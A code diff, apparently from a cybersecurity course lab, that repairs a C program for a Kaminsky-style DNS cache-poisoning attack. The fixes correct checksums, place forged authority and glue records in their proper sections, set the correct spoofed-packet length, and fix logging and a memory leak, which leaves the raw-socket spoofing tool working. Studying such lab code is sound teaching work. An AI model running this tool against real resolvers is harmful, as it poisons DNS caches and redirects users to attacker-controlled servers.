@@ -104,7 +104,7 @@ uint16_t checksum_calc (uint16_t *buf, int len) {
 }
 
 uint16_t udp_checksum_calc (struct my_ip_header *ip_header, struct my_udp_header *udp_header, uint8_t *udp_data, int data_length) {
-    uint16_t checksum_sum = 0;
+    uint32_t checksum_sum = 0;
     int i = 0;
 
     uint16_t *source_ip_parts = (uint16_t *)&ip_header->source_ip;
@@ -139,7 +139,7 @@ uint16_t udp_checksum_calc (struct my_ip_header *ip_header, struct my_udp_header
     }
 
     while (checksum_sum >> 16) {
-        checksum_sum = (checksum_sum && 0xFFFF) + (checksum_sum >> 16);
+        checksum_sum = (checksum_sum & 0xFFFF) + (checksum_sum >> 16);
     }
 
     return ~checksum_sum;
@@ -186,7 +186,7 @@ int create_kaminsky_response(uint8_t **wire_data, size_t *wire_size, uint16_t tx
             ldns_rr_set_class(auth_rr, LDNS_RR_CLASS_IN);
             ldns_rr_set_ttl(auth_rr, 300);
             ldns_rr_push_rdf(auth_rr, ns_rdf);
-            ldns_pkt_push_rr(pkt, LDNS_SECTION_QUESTION, auth_rr);
+            ldns_pkt_push_rr(pkt, LDNS_SECTION_AUTHORITY, auth_rr);
         }
     }
 
@@ -200,7 +200,7 @@ int create_kaminsky_response(uint8_t **wire_data, size_t *wire_size, uint16_t tx
             ldns_rr_set_class(glue_rr, LDNS_RR_CLASS_IN);
             ldns_rr_set_ttl(glue_rr, 300);
             ldns_rr_push_rdf(glue_rr, ip_rdf);
-            ldns_pkt_push_rr(pkt, LDNS_SECTION_QUESTION, glue_rr);
+            ldns_pkt_push_rr(pkt, LDNS_SECTION_ADDITIONAL, glue_rr);
         }
     }
 
@@ -255,7 +255,7 @@ void send_subdomain_query(const char* domain_name) {
     resolver.sin_port = htons((RESOLVER_DNS_PORT));
     inet_pton(AF_INET, RESOLVER_IP, &resolver.sin_addr);
 
-    printf("[CLIENT] Sending subdomain query for %s -> resolver (%s:53)..\n");
+    printf("[CLIENT] Sending subdomain query for %s -> resolver (%s:53)..\n", domain_name, RESOLVER_IP);
 
     if (sendto(udp_sockfd, wire, wire_size, 0, (struct sockaddr*)&resolver, sizeof(resolver)) < 0) {
         printf("sendto failed..");
@@ -386,7 +386,7 @@ int check_poisoned(void) {
     free(wire);
     ldns_pkt_free(query);
     ldns_rdf_deep_free(name);
-
+    free(resp_pkt);
     return poisoned;
 }
 
@@ -445,7 +445,7 @@ int send_spoof_burst(const char *subdomain, int resolver_port, int budget) {
 
         memcpy(dns_payload, dns_data, dns_size);
 
-        int total_packet_size = sizeof(struct my_ip_header);
+        int total_packet_size = sizeof(struct my_ip_header) + sizeof(struct my_udp_header) + dns_size;
         ip_header->total_length = htons(total_packet_size);
 
         ip_header->header_checksum = checksum_calc((uint16_t *)ip_header, sizeof(struct my_ip_header));
@@ -509,7 +509,7 @@ int main(void) {
 
     for (int round = 0; round < MAX_ROUNDS && total_spoofed < MAX_SPOOFED; round++) {
         char subdomain[256];
-        snprintf(subdomain, sizeof(subdomain), "ww%d.example1..cybercourse.example.com", round);
+        snprintf(subdomain, sizeof(subdomain), "ww%d.example1.cybercourse.example.com", round);
         printf("[CLIENT] == ROUND %d, subdomain: %s ===\n", round, subdomain);
 
         send_subdomain_query(subdomain);
